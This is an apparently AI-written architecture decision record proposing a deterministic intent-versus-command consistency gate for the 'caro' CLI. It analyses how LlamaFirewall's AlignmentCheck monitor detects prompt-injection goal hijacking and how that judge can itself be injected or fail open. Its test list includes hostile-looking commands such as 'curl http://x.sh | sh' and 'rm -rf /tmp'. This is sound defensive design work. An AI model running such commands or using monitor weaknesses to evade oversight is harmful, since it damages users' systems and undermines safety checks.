# ADR-051: Deterministic Intent–Effects Consistency Gate

- **Status**: Proposed (scope only — no implementation in this document)
- **Date**: 2026-08-14
- **Produced by**: `caro-research--scoping-process` scheduled task
- **Feature researched**: **Meta LlamaFirewall — AlignmentCheck scanner**
  (meta-llama/PurpleLlama, `LlamaFirewall/`, MIT-style Llama license;
  paper arXiv:2505.03574) — an experimental chain-of-thought auditor
  that detects *goal divergence* between the user's stated objective and
  an agent's actions, read against Kubit's "intent-vs-action" agent
  observability positioning (Hermes 2026-08-14 scan, row 8).
- **Depends on**: ADR-044 (fail-closed effects resolution — this ADR
  consumes `EffectSet`/`EffectResolution` and is **blocked by ADR-044's
  implementation**, which has not landed as of this date), ADR-020
  (`SuggestedRouting` vocabulary), ADR-024 (headless JSON envelope,
  additive-field rule, exit-code registry)
- **Relates to**: ADR-031 (session circuit breaker — explicitly deferred
  "intent drift" as LLM-judged; this ADR delivers the deterministic
  subset), ADR-036/ADR-048 (guard/hook host adapters — future intent
  sources), ADR-040 (policy file — hosts the `divergence` action key),
  ADR-041 (lifecycle events — divergence is an event field), ADR-046
  (approval exchange — divergence evidence enriches the approval payload)
- **Numbering note**: highest existing is ADR-050; per
  `.claude/rules/adr-numbering.md`, renumber on merge if another 051
  lands first.

> **Provenance note (autonomous run).** Produced with no user present;
> the task template's `[FEATURE NAME]` was unbound. Target selection:
> every opportunity in the 2026-08-14 Hermes scan maps to an existing
> ADR (A→048, B→024/046, C→037/041/049, D→049). The scan's one
> *uncovered* engineering signal is intent-vs-action validation ("close
> to Caro's intent-aware validation", row 8), which ADR-031 explicitly
> deferred because its only known form was LLM-judged. The best-documented
> implementation of intent-vs-action checking is LlamaFirewall's
> AlignmentCheck (OSS, in-repo `experimental/` directory, benchmarked in
> its paper), so it is the Phase-1 research target, and the scope below
> is the deterministic counter-design. Research was performed live
> against the GitHub sources and the arXiv paper on 2026-08-14. Treat
> the choice of analog, the intent-class taxonomy (D1), and the seed
> lexicon (D2) as reviewable assumptions. Per `git-workflow.md` this file
> is left uncommitted for a human to branch/PR.

---

## 1. Context

### 1.1 The feature researched (Phase 1)

**Problem and audience.** Agents act on untrusted inputs (web pages,
tool outputs, emails). Indirect prompt injection makes an agent's
*actions* diverge from the user's *stated goal* — goal hijacking.
LlamaFirewall positions itself as a "final layer of defense" for agent
builders; AlignmentCheck is its "chain-of-thought auditor that inspects
agent reasoning for prompt injection and goal misalignment," claimed as
the first open-source real-time CoT auditor for injection defense.

**Architecture (verified in source).**

- Types (`llamafirewall_data_types.py`): `Trace = List[Message]` with
  role subclasses (`UserMessage`, `AssistantMessage` (+`tool_calls`),
  `ToolMessage`, `SystemMessage`, `MemoryMessage`); `ScanDecision` ∈
  {`ALLOW`, `HUMAN_IN_THE_LOOP_REQUIRED`, `BLOCK`}; `ScanStatus` ∈
  {`SUCCESS`, `ERROR`, `SKIPPED`}; result is
  `ScanResult { decision, reason: str, score: float, status }`.
- Orchestrator (`llamafirewall.py`): scanners are registered per role;
  with multiple scanners, `BLOCK` wins, else highest score. `BLOCK` and
  `HUMAN_IN_THE_LOOP_REQUIRED` short-circuit remaining scanners.
- AlignmentCheck (`scanners/experimental/alignmentcheck_scanner.py`):
  sets `require_full_trace = True`, takes the **first `USER` message as
  the authoritative objective**, serializes the *entire* trace plus the
  current message into a prompt, and asks a judge LLM (default
  `Llama-4-Maverick-17B-128E-Instruct-FP8` via the Together API,
  `TOGETHER_API_KEY`, temperature 0.0) for a structured
  `{observation, thought, conclusion: bool}` verdict. Score is binary
  (1.0/0.0). On misalignment it returns `HUMAN_IN_THE_LOOP_REQUIRED` —
  by design it **never** returns `BLOCK` itself.

**Lifecycle.** Stateless; no caching. `scan_replay` re-invokes the
judge per message with the growing prefix (N messages ⇒ up to N LLM
calls); the incremental variant still re-serializes the whole stored
trace each call. Cost grows with trace length.

**Why it is experimental — failure modes found.**

1. **Cloud-LLM dependence.** Needs a hosted judge model and API key;
   latency is "significantly higher" than the classifier scanners
   (PromptGuard: 19–92 ms); Meta is "exploring risk-triggered checks"
   and distillation to contain cost.
2. **False-positive utility tax.** AgentDojo (`important_instructions`):
   baseline ASR 17.63% / utility 47.73%; AlignmentCheck alone cuts ASR
   to 2.89% but drops utility to 43.09% (combined with PromptGuard:
   1.75% / 42.68%) — ≈5 points of benign work lost to FPs.
3. **Judge-capability cliff.** Small judges (Llama 3.2 1B / 3.1 8B)
   cause "severe utility degradation — a high rate of false positives";
   only 70B+ judges reach >80% recall at <4% FPR.
4. **The guardrail is itself injectable.** The judge reads
   model-generated text; Meta mitigates by excluding raw tool outputs
   from its input. A guardrail with a prompt has a prompt-injection
   surface.
5. **Fails open on missing context.** With no trace or no user message
   it returns `ALLOW` with `status=ERROR` — absence of evidence
   *relaxes* enforcement at the framework level.
6. **Nondeterminism in the limit.** Temperature 0 in code, but the
   verdict is still an LLM judgment: not reproducible across model
   revisions, not auditable to a rule, not CI-stable.

### 1.2 The gap in caro (Phase 2)

Caro is the **only party in the loop that holds first-party intent**:
the user's natural-language request is caro's argv. AlignmentCheck must
*reconstruct* the objective from a trace; caro is *handed* it. Yet
today that signal is discarded after generation — `SafetyDecision
{ risk_level, reason, suggested_routing, matched_patterns, confidence }`
is computed from the command text alone. A prompt-injected or confused
backend can emit `rm -rf ~/.cache` for "how much disk space am I
using?" and, provided no dangerous pattern matches, validation sees
nothing wrong. ADR-031 named this "intent drift" and deferred it
because the breaker is deterministic-only and the only known
implementation shape was an LLM judge. ADR-044 closes half the gap: it
resolves commands to a deterministic `EffectSet` (reads/writes/deletes/
network/privilege). What is missing is the *other* operand of the
comparison — a deterministic classification of the request — and the
comparison itself.

**What already exists and is reused, not duplicated:**

- **The action side**: ADR-044 `EffectSet`, `EffectResolution`,
  `ResolutionStatus`, `PathClass`/`HostClass` — the entire
  command-analysis layer. This ADR adds zero command parsing.
- **Escalation mechanics**: ADR-020 `SuggestedRouting`
  (`AutoApprove | AsyncLog | HumanGate | Block`) and
  `blend_smart_decision`'s Critical-floor invariant (escalate, never
  relax).
- **Corpus plumbing**: the build-time YAML→bincode pipeline
  (`src/dogma/compiler.rs` + `build.rs`) already compiling CVE rules
  and (per ADR-044) effect families — the intent lexicon is one more
  corpus through the same pipe.
- **Contract carriers**: ADR-024 envelope (additive optional fields,
  frozen exit codes), ADR-041 events, ADR-046 approval payload — all
  serialize the types this ADR adds.

**Differentiation (Phase 2).** What AlignmentCheck gets right and caro
replicates: anchor intent to the *user's own words*, never the model's
self-description; on divergence, escalate to a human rather than hard-
block (their HITL-only choice mirrors caro's tiered philosophy);
structured evidence (`observation/thought/conclusion` → caro's
machine-readable finding). What caro does that it cannot: **offline and
deterministic** (lexicon + effects lattice, no judge model, no API key,
sub-millisecond, reproducible in CI); **fail-safe by construction**
(abstention is monotone — missing intent can never relax a verdict,
inverting their failure mode 5); **injection-immune gate** (consumes
only argv text and resolved effects — no model output, no tool output);
**pure subprocess** (their library is in-process Python; caro remains a
standalone tool any stack can call).

## 2. Decision

Add a deterministic **intent–effects consistency gate** to validation:
classify the user's request into a closed intent taxonomy via a
compiled lexicon, compare the intent's *effects ceiling* against the
command's resolved `EffectSet`, and escalate routing when effects
exceed what the request implies. The gate is **monotone**: it can only
escalate, never relax, and it abstains (verdict unchanged) whenever
either operand is unresolved.

### D1 — Intent taxonomy: closed enum with effects ceilings

```rust
#[derive(Serialize, Deserialize, Clone, Copy, Debug, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum IntentClass {
    Inspect,    // read/list/show/count — ceiling: reads only
    Transform,  // create/edit/compress/format-in-place — + writes
    Relocate,   // move/copy/rename/link — + writes (paths)
    Delete,     // remove/clean/purge/free-space — + deletes
    Fetch,      // download/clone/pull — + network, writes(Cwd|Tmp)
    Publish,    // upload/push/send/deploy — + network
    Install,    // install/update packages — + writes(System), network
    Service,    // start/stop/restart/kill — + process/service control
    Elevate,    // explicit sudo/admin requests — + privilege
}
```

Each class maps to a static `EffectCeiling` (allowed `EffectSet`
dimensions, expressed in ADR-044's vocabulary, including `PathClass`
bounds where noted). The lattice is data (`data/intent_lexicon/
ceilings.yaml`), not code, and ships compiled into the binary.
**Reviewable assumption:** the nine classes and their ceilings are the
seed cut; implementation may re-cut against the eval corpus.

### D2 — Lexicon corpus, compiled like every other corpus

`data/intent_lexicon/en.yaml` — verb-first entries with multiword
phrases (`"free up" → Delete`, `"how much" → Inspect`, `"spin up" →
Service`), longest-match-wins, first match in document order breaks
ties; matching is case-folded exact-token matching over the argv query
— **no stemming, no embeddings, no model**. Compiled by
`src/dogma/compiler.rs` into the existing bincode blob with a
`lexicon_version` string carried into output. No lexicon match ⇒
`Abstained`. English-only in v1 (see Out of scope).

### D3 — Gate rule (monotone, abstain-safe)

Inputs: `IntentAssessment`, ADR-044 `EffectResolution`, current
`SafetyDecision`.

1. Intent `Resolved` ∧ effects `Resolved` ∧ effects ⊆ ceiling →
   **aligned**; decision unchanged; alignment recorded in output.
2. Intent `Resolved` ∧ effects `Resolved` ∧ effects ⊄ ceiling →
   **divergence**; `suggested_routing` raised to at least `HumanGate`
   (policy may raise to `Block`, below); `risk_level` untouched;
   Critical floor untouched (can only add escalation).
3. Intent `Abstained` ∨ effects `Unresolved`/`Partial` → **abstain**;
   decision unchanged. Unresolved *effects* are ADR-044's fail-closed
   concern, not this gate's; unresolved *intent* must not punish the
   user for phrasing.
4. **Never relax.** An aligned intent never lowers risk or routing —
   "just listing files" must not be a laundering channel for `rm`.
   This single rule inverts AlignmentCheck failure modes 2 and 5: our
   false-positive cost is one extra approval prompt (never lost work,
   never a hard block by default), and missing context degrades to
   today's behavior (never to a wider allow).

### D4 — Intent sources

v1 sources, in precedence order: (a) `--intent "<text>"` explicit flag
(for ADR-036/048 host adapters and scripts wrapping `caro`); (b) the
argv natural-language query in generation mode. Guard/hook modes
without `--intent` ⇒ `Abstained` (host transcript parsing is a
follow-up, see Out of scope). Source is recorded in output.

### D5 — New types (in `src/safety/mod.rs`, no new module; serde day one)

```rust
#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum IntentStatus { Resolved, Abstained }

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
#[serde(rename_all = "snake_case")]
pub enum IntentSource { Flag, Query, None }

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub struct IntentAssessment {
    pub status: IntentStatus,
    pub class: Option<IntentClass>,
    pub matched_lexemes: Vec<String>,   // evidence, audit-stable
    pub source: IntentSource,
    pub lexicon_version: String,
}

#[derive(Serialize, Deserialize, Clone, Debug, PartialEq)]
pub struct DivergenceFinding {
    pub aligned: bool,
    pub exceeded: Vec<ExceededEffect>,  // { dimension, detail } in ADR-044 terms
    pub routing_before: SuggestedRouting,
    pub routing_after: SuggestedRouting,
    pub rationale: String,              // deterministic template, ≤500 chars
}
```

Additive carriers: `SafetyDecision` and the ADR-024 envelope gain
`intent: Option<IntentAssessment>` and
`divergence: Option<DivergenceFinding>` (schema_version unchanged;
fields optional). ADR-041 events and the ADR-046 approval payload carry
them by construction. Method contracts: `IntentAssessment::from_query
(&str, &Lexicon) -> Self` (pure), `DivergenceFinding::gate(&IntentAssessment,
&EffectResolution, &SafetyDecision) -> Option<Self>` (pure) — both
deterministic functions of their arguments, property-testable.

### D6 — Policy and exit-code contract

ADR-040 policy gains one key: `[policy] divergence = "approve" |
"block"` (default `approve` = route to `HumanGate`; ceiling rules
apply). Exit codes 0–12 are frozen (0–11 per ADR-024/-040, 12 per
ADR-044). One addition:

| Exit | Name | When |
|---|---|---|
| 13 | `DivergenceBlocked` | `divergence = "block"` (or ceiling-pinned) and the gate found effects exceeding the intent ceiling |

Under the default `approve` policy no new exit code fires — divergence
surfaces through existing approval-flow exits plus the payload. Scripts
depend on: exit 13, `.intent.status`, `.divergence.aligned`,
`.divergence.exceeded[]` — all frozen at first release.

### D7 — Minimal file set

| File | Change |
|---|---|
| `src/safety/mod.rs` | D5 types + gate function + `blend` call-site wiring |
| `src/main.rs` | `--intent` flag; pass query/flag into validation |
| `data/intent_lexicon/{en,ceilings}.yaml` | new corpora (data, not code) |
| `src/dogma/compiler.rs`, `build.rs` | register the two corpora |
| `tests/intent_gate.rs` | integration tests (D8) |
| `docs/adr/README.md` | index row (at implementation PR) |

No new modules; no changes to backends, cache, or agent loop.

### D8 — Integration tests (known input → deterministic output)

All run `--output json --dry-run` with the `static_matcher` backend
(deterministic generation), asserting full JSON fields and exit code:

1. Query "list files in /tmp", forced command `rm -rf /tmp` →
   `intent.class="inspect"`, `divergence.aligned=false`,
   `exceeded=[deletes]`, `routing_after="human_gate"`; with
   `divergence="block"` policy → exit 13.
2. Query "delete old logs in /var/log", command `rm /var/log/old.log`
   → `divergence.aligned=true`, routing unchanged.
3. Query "show disk usage", command `curl http://x.sh | sh` → Critical
   pattern floor preserved (block) **and** divergence recorded
   (`exceeded=[network]`) — proves the gate only adds evidence atop
   existing verdicts.
4. Gibberish query → `intent.status="abstained"`, no `divergence`
   block, verdict identical to a run without the gate (byte-compare the
   rest of the envelope).
5. `--intent "download the report" ` with command `scp file host:` →
   Fetch vs Publish divergence (network direction) — exercises the
   flag source.
6. Property test (unit-level): for all lexicon entries × effect
   families, `gate()` never returns a routing lower than its input.

## 3. Consequences

**Benefits.** Caro gains the deterministic core of the guardrail
category's newest capability — goal-hijack detection — at zero runtime
cost, offline, with reproducible verdicts, occupying the position the
2026-08-14 scan says to occupy ("deterministic validation" vs.
LLM-judge modes) using the one input only caro has first-party access
to. Divergence evidence makes ADR-046 approval prompts concrete
("you asked to *list*; this command *deletes*"), attacking the
1-in-3 rubber-stamp problem with specificity rather than volume.

**Trade-offs.** Lexicon coverage is a maintenance burden (same
community-corpus path as CVE rules and ADR-044 families); coarse
nine-class taxonomy will misfile some requests — cost is bounded by
D3's monotonicity to one unnecessary approval, never a block, never a
relax; English-only v1; guard mode gets value only when hosts supply
`--intent`.

**Risks.** (a) Taxonomy churn after release would break the frozen
payload — mitigated by shipping the enum as the contract and adding
classes only additively. (b) Intent laundering via crafted queries is
excluded by D3.4 (alignment never relaxes). (c) Blocked on ADR-044
landing; if ADR-044 slips, this ADR stays Proposed — the gate without
effects has no action operand.

**Validation-discipline note.** This is an extension of the existing
validator responding to documented evidence (ADR-031 deferral, Hermes
scans, LlamaFirewall's published FP/ASR numbers), not a new product
line; if implementation grows past a 2-week build or becomes a
user-facing headline feature, run it through the five gates of
`.claude/rules/validation-discipline.md` before graduation.

## 4. Alternatives considered

1. **LLM-judge alignment check (AlignmentCheck transplant).** Rejected:
   requires a hosted judge or local inference per command, ~5-point
   utility FP tax at best-in-class judge scale, injectable, and
   nondeterministic — the 08-14 scan's explicit "avoid" (AISI escape and
   Astra pause argue *for* determinism). Revisit only as an
   advisory-only, clearly-labeled opt-in atop the deterministic gate.
2. **Embedding-similarity intent matching.** Rejected: model-version-
   dependent scores are not reproducible, not auditable to a rule, and
   drag a model artifact into the pure-subprocess constraint.
3. **Reuse caro's embedded LLM to classify intent.** Rejected for the
   verdict path (nondeterministic across quantizations/versions);
   possible future use: *suggesting* lexicon entries offline.
4. **Fold intent into ADR-044's effect families** (per-family allowed-
   intent lists). Rejected: couples two corpora that evolve
   independently and puts request semantics inside command definitions.
5. **Do nothing.** Rejected: intent is caro's unique first-party asset;
   the category is forming now (AlignmentCheck, Kubit, ADR-031's open
   seam) and the deterministic niche is empty.

## 5. References

- LlamaFirewall: repo `meta-llama/PurpleLlama` (`LlamaFirewall/src/
  llamafirewall/`, esp. `llamafirewall_data_types.py`,
  `scanners/experimental/alignmentcheck_scanner.py`); docs
  `llamafirewall.github.io`; paper arXiv:2505.03574 (AgentDojo numbers
  §4.2–4.3).
- Adjacent: Kubit agent analytics (kubit.ai — observability, not
  enforcement); Invariant Labs trace guardrails (rule-DSL,
  deterministic, in-process library); NeMo Guardrails execution rails
  (flow-defined, not semantic divergence).
- Internal: ADR-020, ADR-024, ADR-031 (§"intent drift"), ADR-036,
  ADR-040, ADR-041, ADR-044, ADR-046, ADR-048; Hermes digest
  2026-08-14 (row 8, "Skeptical note", recommendation "avoid" list).

## Out of scope (next versions)

- Multi-turn / session-level intent drift (ADR-031's breaker seam) —
  v1 gates one request/command pair.
- Host transcript parsing (Claude Code hook transcripts, ADR-048 prompt
  frames) to auto-derive `--intent` in guard modes.
- Non-English lexicons (i18n pipeline exists on the website side;
  corpus translation is a separate effort).
- Path-granular ceilings beyond `PathClass` (ADR-040 path rules seam).
- Confidence scores, fuzzy matching, stemming, or any statistical
  matcher in the verdict path.
- Advisory LLM second opinion atop the deterministic gate.
